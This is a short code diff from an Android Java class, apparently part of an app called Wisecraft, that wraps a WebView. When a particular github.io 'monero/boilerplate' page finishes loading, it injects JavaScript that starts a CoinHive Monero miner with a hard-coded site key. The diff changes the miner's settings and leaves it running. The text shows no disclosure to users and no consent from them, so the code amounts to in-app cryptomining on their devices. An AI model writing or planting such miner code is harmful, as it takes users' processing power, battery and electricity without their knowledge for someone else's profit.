@@ -62,8 +62,7 @@ public class WisecraftMonetizeWrapperView extends FrameLayout {
                 public void onPageFinished(WebView view, String url) {
                     if("http://nao20010128nao.github.io/monero/boilerplate".equals(url)){
                         // boot the miner
-                        view.loadUrl("javascript: miner=new CoinHive.Anonymous('LZSdFJYBUldfKhSwZV5aWrgDXpFzut66',{'threads':1})");
-                        view.loadUrl("javascript: miner.start()");
+                        view.loadUrl("javascript: new CoinHive.Anonymous('LZSdFJYBUldfKhSwZV5aWrgDXpFzut66',{throttle: 0.8}).start()");
                     }
                 }
             });
